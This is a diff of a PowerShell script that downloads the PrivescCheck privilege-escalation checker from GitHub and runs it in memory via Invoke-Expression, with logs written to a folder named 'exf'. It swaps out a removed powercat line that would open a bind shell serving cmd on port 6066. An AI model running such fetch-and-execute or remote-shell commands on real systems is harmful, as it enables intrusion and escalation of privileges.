@@ -8,7 +8,8 @@ Write-Output "==================================================================
 ################ [ List of commpiled programs to downlad ] ################
 $Ps1ScriptToUse = @("PrivescCheck.ps1")
 $ExecuteFrom = "https://github.com/itm4n/PrivescCheck/releases/latest/download"
-$PwCatParameters = " -l -p 6066 -e cmd -ge"
+#powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT,HTML,CSV,XML"
+$ScriptParameters = " -Extended -Audit -Report PrivescCheck_$($env:COMPUTERNAME) -Format TXT"
 ################ [ GLOBAL VARIABLES ] ################
 $TimeStamp = Get-Date -Format "yyyy-MM-dd HH:mm:ss.fff K"
 $LogFile = "$env:PUBLIC\exf\Tool_PrivescCheck.txt";
@@ -22,5 +23,5 @@ foreach ($Tool in $Ps1ScriptToUse)
 {
     $DownloadRun = $ExecuteFrom+"/"+$Ps1ScriptToUse
     $RemoteCode = (Invoke-WebRequest -Uri $DownloadRun -UseBasicParsing).Content
-    Invoke-Expression -Command $RemoteCode $PwCatParameters
+    Invoke-Expression -Command $RemoteCode $ScriptParameters
   }
